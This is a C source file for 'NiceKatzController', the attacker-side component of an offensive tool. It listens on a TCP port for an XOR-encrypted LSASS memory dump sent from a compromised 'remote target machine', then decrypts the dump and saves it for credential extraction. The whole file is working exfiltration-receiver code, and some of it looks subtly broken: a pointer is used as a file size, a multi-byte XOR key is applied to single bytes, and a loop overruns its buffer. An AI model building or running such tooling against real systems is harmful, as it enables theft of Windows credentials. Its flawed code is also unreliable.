#include "NiceKatzController.h"

int main()
{
    CommandLineArgs CmdArgs = { 0 };

    if (!ParseArgs(&CmdArgs))
    {
        return FALSE;
    }

    if (CmdArgs.bListen)
    {
        if (!ReciveDump(&CmdArgs))
        {
            return FALSE;
        }
    }
    else if (CmdArgs.bDecryptDumpFile)
    {
        if (!DecryptDumpFile(CmdArgs.DumpFileName))
        {
            return FALSE;
        }
    }
    return TRUE;
}


BOOL ParseArgs(pCommandLineArgs pCmdArgs)
{

    LPWSTR* ArgList;
    uint32_t NumOfArgs;

    ArgList = CommandLineToArgvW(GetCommandLine(), (int*)&NumOfArgs);
    if (ArgList == NULL)
    {
        printf("[-] Failed to retreive command line args\n");
        GetError(L"CommandLineToArgvW");
        return FALSE;
    }

    if (NumOfArgs > 5 || NumOfArgs < 2)
    {
        printf("ERROR: Incorrect number of arguments!\n");
        goto PrintUsage;
        return FALSE;
    }

    int i;
    for (i = 1; i < NumOfArgs; i++)
    {
        if (_wcsicmp(ArgList[i], L"-l") == 0)
        {
            pCmdArgs->bListen = TRUE;
        }
        else if (_wcsicmp(ArgList[i], L"-d") == 0)
        {
            pCmdArgs->bDecryptDump = TRUE;
        }
        else if (_wcsicmp(ArgList[i], L"-df") == 0)
        {
            if (i + 1 < NumOfArgs)
            {
                i++;
                pCmdArgs->bDecryptDumpFile = TRUE;
                wcsncpy_s(pCmdArgs->DumpFileName, _countof(pCmdArgs->DumpFileName), ArgList[i], _TRUNCATE);
            }
            else
            {
                printf("ERROR: -df option should be followed by dump file path!\n");
                goto PrintUsage;
            }
        }
        else if (_wcsicmp(ArgList[i], L"-p") == 0)
        {
            if (i + 1 < NumOfArgs)
            {
                i++;
                if (!ValidateNumber(ArgList[i]))
                {
                    printf("ERROR: Port to listen can only contain digits!\n");
                    goto PrintUsage;
                }
                wcsncpy_s(pCmdArgs->PortToListen, _countof(pCmdArgs->PortToListen), ArgList[i], _TRUNCATE);
            }
            else
            {
                printf("ERROR: -p option should be followed by the port number to listen on!\n");
                goto PrintUsage;
            }
        }
        else
        {
            printf("ERROR: %S is an invalid option!\n", ArgList[i]);
            goto PrintUsage;
        }
    }

    LocalFree(ArgList);
    return TRUE;

PrintUsage:
    LocalFree(ArgList);
    Usage();
    return FALSE;
}
// If not checking range delete there too
BOOL ValidateNumber(WCHAR* String)
{
    while (*String)
    {
        if (!isdigit(*String))
        {
            return FALSE;
        }
        String++;
    }
    return TRUE;
}

BOOL DecryptDumpFile(WCHAR FilePath[MAX_PATH])
{
    HANDLE hFile = CreateFile(
        FilePath,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open file for decryption\n");
        GetError(L"CreateFile");
        return FALSE;
    }

    PLARGE_INTEGER pFileSize;
    if (!GetFileSizeEx(hFile, &pFileSize))
    {
        printf("[-] Failed to get file size!\n");
        GetError(L"GetFileSizeEx");
        return FALSE;
    }

    DWORD BytesRead = 0;
    LPVOID DumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pFileSize);
    if (DumpBuffer == NULL)
    {
        printf("[-] Failed to allocate heap memory to read the dump file to memory\n");
        GetError(L"HeapAlloc");
        return FALSE;
    }
    if (!ReadFile(hFile, DumpBuffer, pFileSize, &BytesRead, NULL))
    {
        printf("[-] Failed to read file into memory!\n");
        GetError(L"ReadFile");
        goto ReturnFalse;
    }

    Decryptor(DumpBuffer, BytesRead);
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

    if (WriteFile(hFile, DumpBuffer, BytesRead, NULL, NULL))
    {
        printf("\n[+] lsass dump decrypted!!!\n");
    }
    else
    {
        printf("[-] Failed to write decrypted dump file to disk!\n");
        GetError(L"WriteFile");
        goto ReturnFalse;
    }
    HeapFree(GetProcessHeap(), 0, DumpBuffer);
    DumpBuffer = NULL;
    return TRUE;

ReturnFalse:
    HeapFree(GetProcessHeap(), 0, DumpBuffer);
    DumpBuffer = NULL;
    return FALSE;
}

BOOL ReciveDump(pCommandLineArgs pCmdArgs) {
    WSADATA wsaData;
    int iResult;

    SOCKET ListenSocket = INVALID_SOCKET;
    SOCKET ClientSocket = INVALID_SOCKET;

    struct addrinfoW* result = NULL;
    struct addrinfoW hints;

    int iSendResult;
    CHAR recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0)
    {
        GetError(L"WSAStartup");
        return FALSE;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    iResult = GetAddrInfoW(NULL, pCmdArgs->PortToListen, &hints, &result);
    if (iResult != 0)
    {
        GetError(L"getaddrinfo");
        WSACleanup();
        return FALSE;
    }

    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ListenSocket == INVALID_SOCKET)
    {
        GetError(L"socket");
        freeaddrinfo(result);
        WSACleanup();
        return FALSE;
    }

    iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR)
    {
        GetError(L"bind");
        freeaddrinfo(result);
        goto ReturnFalse;
    }

    freeaddrinfo(result);

    iResult = listen(ListenSocket, SOMAXCONN);
    if (iResult == SOCKET_ERROR)
    {
        GetError(L"listen");
        goto ReturnFalse;
    }

    printf("[+] Listening for connections on port: %S\n", pCmdArgs->PortToListen);

    ClientSocket = accept(ListenSocket, NULL, NULL);
    if (ClientSocket == INVALID_SOCKET)
    {
        GetError(L"accept");
        goto ReturnFalse;
    }

    closesocket(ListenSocket);

    WCHAR FileName[11] = { 0 };
    GenerateOutFileName(FileName);

    HANDLE hFile = CreateFile(
        FileName,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to create file for output dump\n");
        GetError(L"CreateFile");
        goto ReturnFalse;
    }

    do {
        iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
        if (iResult > 0)
        {
            if (pCmdArgs->bDecryptDump)
            {
                Decryptor(recvbuf, iResult);
            }
            if (!WriteFile(hFile, (LPVOID)&recvbuf, iResult, NULL, NULL))
            {
                printf("[-] Failed to write the data recived from the target\n");
                GetError(L"WriteFile");
                goto ReturnFalse;
            }

        }
        else if (iResult == 0)
        {
            printf("[+] Recived dump file from remote machine!\n");
            printf("[+] Output dump file wrriten to: %S\n", FileName);
            printf("[!] Connection closing...\n");
        }
        else
        {
            GetError(L"recv");
            goto ReturnFalse;
        }

    } while (iResult > 0);

    iResult = shutdown(ClientSocket, SD_SEND);
    if (iResult == SOCKET_ERROR)
    {
        GetError(L"shutdown");
        goto ReturnFalse;
    }

    closesocket(ClientSocket);
    WSACleanup();
    return TRUE;

ReturnFalse:
    closesocket(ClientSocket);
    WSACleanup();
    return FALSE;
}


void GenerateOutFileName(WCHAR* pFileName)
{
    srand(time(0));
    for (int i = 0; i < 6; i++)
    {
        pFileName[i] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"[rand() % 52];
    }
    pFileName = wcscat_s(pFileName, 11, L".dmp");
}

void Decryptor(PVOID DumpBuffer, int BytesRead)
{
    int i;
    for (i = 0; i <= BytesRead; i++)
    {
        *((BYTE*)DumpBuffer + i) = *((BYTE*)DumpBuffer + i) ^ 0x4B1D;
    }
}

void GetError(WCHAR* FunctionName)
{
    DWORD ErrorCode = GetLastError();
    LPTSTR ErrorText = NULL;

    FormatMessage(
        FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        ErrorCode,
        LANG_SYSTEM_DEFAULT,
        &ErrorText,
        0,
        NULL);

    printf("[-] The function %S failed with error code %d - %S", FunctionName, ErrorCode, ErrorText);
    LocalFree(ErrorText);
}

void Usage()
{
    printf("\nNiceKatzController\n\tAlon Leviev(@0xDeku)\n\n");
    printf("Arguments:\n"
        "-l Listen for connections from remote target machine\n"
        "-d Decrypt the dump file when recived from the target\n"
        "-df Decrypt an encrypted dump file by path(Not supported with other arguments)\n");
    printf("\n");
    printf("Examples: \n"
        "- Listen for connections from remote target and decrypt the recived dump file:\n"
        "\tNiceKatzController.exe -l -d\n"
        "- Decrypt an encrypted dump file by its path:\n"
        "\tNiceKatzController.exe -df C:\\Temp\\dump.dmp\n");
    printf("\n");
}
